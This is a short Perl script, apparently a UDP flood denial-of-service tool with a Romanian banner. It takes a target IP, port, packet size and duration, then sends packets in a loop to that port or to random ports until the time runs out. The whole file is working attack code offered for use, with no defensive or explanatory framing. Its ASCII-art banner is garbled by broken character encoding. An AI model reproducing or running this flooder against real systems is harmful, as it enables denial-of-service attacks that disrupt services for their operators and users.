#!/usr/bin/perl
use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "404 not found $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print " [1;37m ----------------------------------------------------------------------------- \n";
print " [1;36m va pwp! \n";
print " [1;36m o dam asa mai gangsta ma?  \n";
print " [0;32m â–„ â€¢â–„ â–„â–„â–„ .â–„â–„â–Œ  â–„â–„â–Œ      Â·â–„â–„â–„â–„  Â·â–„â–„â–„â–„        .â–„â–„ Â·     â–„ â€¢â–„ â–ª  Â·â–„â–„â–„â–„  .â–„â–„ Â· â–„â–„  \n";
print " [0;32m â–ˆâ–Œâ–„â–Œâ–ªâ–€â–„.â–€Â·â–ˆâ–ˆâ€¢  â–ˆâ–ˆâ€¢      â–ˆâ–ˆâ–ª â–ˆâ–ˆ â–ˆâ–ˆâ–ª â–ˆâ–ˆ â–ª     â–â–ˆ â–€.     â–ˆâ–Œâ–„â–Œâ–ªâ–ˆâ–ˆ â–ˆâ–ˆâ–ª â–ˆâ–ˆ â–â–ˆ â–€. â–ˆâ–ˆâ–Œ \n";
print " [0;32m â–â–€â–€â–„Â·â–â–€â–€â–ªâ–„â–ˆâ–ˆâ–ª  â–ˆâ–ˆâ–ª      â–â–ˆÂ· â–â–ˆâ–Œâ–â–ˆÂ· â–â–ˆâ–Œ â–„â–ˆâ–€â–„ â–„â–€â–€â–€â–ˆâ–„    â–â–€â–€â–„Â·â–â–ˆÂ·â–â–ˆÂ· â–â–ˆâ–Œâ–„â–€â–€â–€â–ˆâ–„â–â–ˆÂ· \n";
print " [0;32m â–â–ˆ.â–ˆâ–Œâ–â–ˆâ–„â–„â–Œâ–â–ˆâ–Œâ–â–Œâ–â–ˆâ–Œâ–â–Œ    â–ˆâ–ˆ. â–ˆâ–ˆ â–ˆâ–ˆ. â–ˆâ–ˆ â–â–ˆâ–Œ.â–â–Œâ–â–ˆâ–„â–ªâ–â–ˆ    â–â–ˆ.â–ˆâ–Œâ–â–ˆâ–Œâ–ˆâ–ˆ. â–ˆâ–ˆ â–â–ˆâ–„â–ªâ–â–ˆ.â–€  \n";
print " [0;32m Â·â–€  â–€ â–€â–€â–€ .â–€â–€â–€ .â–€â–€â–€     â–€â–€â–€â–€â–€â€¢ â–€â–€â–€â–€â–€â€¢  â–€â–ˆâ–„â–€â–ª â–€â–€â–€â–€     Â·â–€  â–€â–€â–€â–€â–€â–€â–€â–€â–€â€¢  â–€â–€â–€â–€  â–€  \n";
print " [1;35m detalii: ip-ul: $ip port-ul: $port packete: $size timp: $time \n";
print " [1;35m 0=random/infinite time. \n";
print " [1;37m ----------------------------------------------------------------------------- \n";

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}

#cancel(^C)